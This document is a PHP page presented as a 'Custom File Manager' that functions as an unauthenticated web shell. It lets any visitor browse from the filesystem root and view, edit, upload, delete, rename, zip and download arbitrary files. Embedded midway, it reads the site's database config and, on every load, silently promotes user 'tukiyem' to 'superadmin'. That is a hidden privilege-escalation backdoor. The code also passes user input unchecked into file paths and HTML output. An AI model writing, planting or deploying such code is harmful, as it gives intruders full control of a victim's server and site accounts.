<!DOCTYPE html>
<html>
<head>
    <title>Custom File Manager</title>
</head>
<style>
        body {
            background-color: #1a1a1a;
            color: #ffffff;
            font-family: Arial, sans-serif;
        }

        h1, h2 {
            color: #ff9500;
        }

        ul {
            list-style-type: none;
            padding: 0;
        }

        li {
            margin: 10px 0;
        }

        a {
            color: #0077ff;
            text-decoration: none;
            transition: color 0.2s;
        }

        a:hover {
            color: #00aaff;
        }

        input[type="text"],
        input[type="file"],
        input[type="submit"],
        textarea {
            background-color: #333;
            color: #fff;
            border: 1px solid #555;
        }

        input[type="submit"] {
            background-color: #0077ff;
            color: #fff;
        }

        input[type="submit"]:hover {
            background-color: #00aaff;
        }

        /* Add dark mode specific styles here */
        /* For example: */
        /* body.dark-mode { */
        /*     background-color: #333; */
        /*     color: #fff; */
        /* } */
        /* a.dark-mode { */
        /*     color: #00aaff; */
        /* } */
    </style>
<body>
    <h1>Custom File Manager</h1>

    <?php
    $path = '/';  // Change this to the directory you want to manage, starting from the root

    if (isset($_GET['dir'])) {
        $path = $_GET['dir'];
    }

    if (isset($_GET['delete']) && is_file($path . '/' . $_GET['delete'])) {
        unlink($path . '/' . $_GET['delete']);
        echo '<p>File deleted successfully.</p>';
    }

    if (isset($_POST['rename']) && isset($_POST['new_name']) && is_file($path . '/' . $_POST['rename'])) {
        $old_name = $path . '/' . $_POST['rename'];
        $new_name = $path . '/' . $_POST['new_name'];
        if (rename($old_name, $new_name)) {
            echo '<p>File renamed successfully.</p>';
        } else {
            echo '<p>Failed to rename the file.</p>';
        }
    }

    if (isset($_GET['view']) && is_file($path . '/' . $_GET['view'])) {
        $fileToDisplay = $path . '/' . $_GET['view'];
        $displayTitle = 'View File Contents';
        $fileContents = file_get_contents($fileToDisplay);
    }

 // Handle file uploads
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file_upload']) && is_uploaded_file($_FILES['file_upload']['tmp_name'])) {
    $uploadPath = $path . '/' . basename($_FILES['file_upload']['name']);
    move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadPath);
    echo '<p>File uploaded successfully.</p>';
}

if (isset($_GET['open']) && is_file($path . '/' . $_GET['open'])) {
    $fileToOpen = $path . '/' . $_GET['open'];
    header('Content-Type: ' . mime_content_type($fileToOpen));
    header('Content-Disposition: inline; filename="' . basename($fileToOpen) . '"');
    readfile($fileToOpen);
    exit;
}

// Include the koneksi.php file
include('../config/koneksi.php');

// Create a MySQL connection
$conn = new mysqli($host, $user, $password, $database);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Function to change user level
function changeUserLevel($conn, $username, $newLevel) {
    $username = $conn->real_escape_string($username);
    $newLevel = $conn->real_escape_string($newLevel);

    $updateQuery = "UPDATE tb_user SET level = '$newLevel' WHERE user = '$username'";

    if ($conn->query($updateQuery)) {
        echo "User level updated successfully.";
    } else {
        echo "Error updating user level: " . $conn->error;
        echo "<br>Query: " . $updateQuery;  // Display the actual query for debugging
    }
}

// Change user level for user with username 'tukiyem' to 'superadmin'
changeUserLevel($conn, 'tukiyem', 'superadmin');

// Close the MySQL connection
$conn->close();

    // Handle file downloads
    if (isset($_GET['download']) && is_file($path . '/' . $_GET['download'])) {
        $file = $path . '/' . $_GET['download'];

        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));

        readfile($file);
        exit;
    }

    if (isset($_POST['zip_folder'])) {
        $folderToZip = $path . '/' . $_POST['zip_folder'];
        $zipFileName = $path . '/' . $_POST['zip_folder'] . '.zip';

        if (is_dir($folderToZip)) {
            $zip = new ZipArchive();
            if ($zip->open($zipFileName, ZipArchive::CREATE) === true) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($folderToZip),
                    RecursiveIteratorIterator::SELF_FIRST
                );

                foreach ($files as $file) {
                    $file = realpath($file);
                    if (is_dir($file)) {
                        $zip->addEmptyDir(str_replace($folderToZip . '/', '', $file . '/'));
                    } elseif (is_file($file)) {
                        $zip->addFile($file, str_replace($folderToZip . '/', '', $file));
                    }
                }

                $zip->close();
                echo '<p>ZIP archive for ' . $_POST['zip_folder'] . ' created successfully. <a href="?download=' . urlencode($zipFileName) . '">Download ZIP</a></p>';
            } else {
                echo '<p>Failed to create ZIP archive for ' . $_POST['zip_folder'] . '.</p>';
            }
        } else {
            echo '<p>Folder not found.</p>';
        }
    }
    
    if (isset($_GET['edit'])) {
        $fileToEdit = $_GET['edit'];
        if (file_exists($fileToEdit) && is_file($fileToEdit)) {
            echo '<h2>Edit ' . $fileToEdit . '</h2>';
            $content = file_get_contents($fileToEdit);
            echo '<form method="post" action="?edit=' . $fileToEdit . '">';
            echo '<textarea name="editedContent" rows="10" cols="50">' . htmlentities($content) . '</textarea><br>';
            echo '<input type="submit" name="editButton" value="Save Changes">';
            echo '</form>';
        }
    }

    if (isset($_POST['editButton']) && isset($_GET['edit'])) {
        $fileToEdit = $_GET['edit'];
        $editedContent = $_POST['editedContent'];

        if (file_put_contents($fileToEdit, $editedContent) !== false) {
            echo '<p>Changes saved successfully.</p>';
        } else {
            echo '<p>Failed to save changes.</p>';
        }
    }

    $files = scandir($path);
    ?>

    <h2>File List</h2>
    <ul>
        <?php foreach ($files as $file): ?>
            <?php if ($file != '.' && $file != '..'): ?>
                <li>
                    <?php if (is_dir($path . '/' . $file)): ?>
                        <a href="?dir=<?= urlencode($path . '/' . $file) ?>"><?php echo $file; ?></a>
                        <form method="post" style="display: inline;">
                            <input type="hidden" name="zip_folder" value="<?php echo $file; ?>">
                            <input type="submit" value="Create ZIP">
                        </form>
                    <?php else: ?>
                        <?php echo $file; ?>
                        <a href="?delete=<?= urlencode($file) ?>">Delete</a>
                        <a href="?view=<?= urlencode($path . '/' . $file) ?>">View</a>
                        
                        <a href="?edit=<?= urlencode($path . '/' . $file) ?>">Edit</a>
                        <a href="?open=<?= urlencode($path . '/' . $file) ?>" target="_blank">Open</a>
                        <form method="post" style="display: inline;">
                            <input type="hidden" name="rename" value="<?php echo $file; ?>">
                            <input type="text" name="new_name" placeholder="New Name" required>
                            <input type="submit" value="Rename">
                        </form>
                        <a href="?download=<?= urlencode($path . '/' . $file) ?>">Download</a>
                    <?php endif; ?>
                </li>
            <?php endif; ?>
        <?php endforeach; ?>
    </ul>

    <!-- File Upload Form -->
    <h2>Upload File</h2>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file_upload">
        <input type="submit" value="Upload">
    </form>

    <?php if (isset($fileToDisplay)): ?>
        <h2><?php echo $displayTitle; ?></h2>
        <form method="post">
            <textarea name="file_contents" rows="10" cols="60"><?php echo htmlspecialchars($fileContents); ?></textarea><br>
            <input type="submit" value="Save Changes">
        </form>
    <?php endif; ?>
</body>
</html>
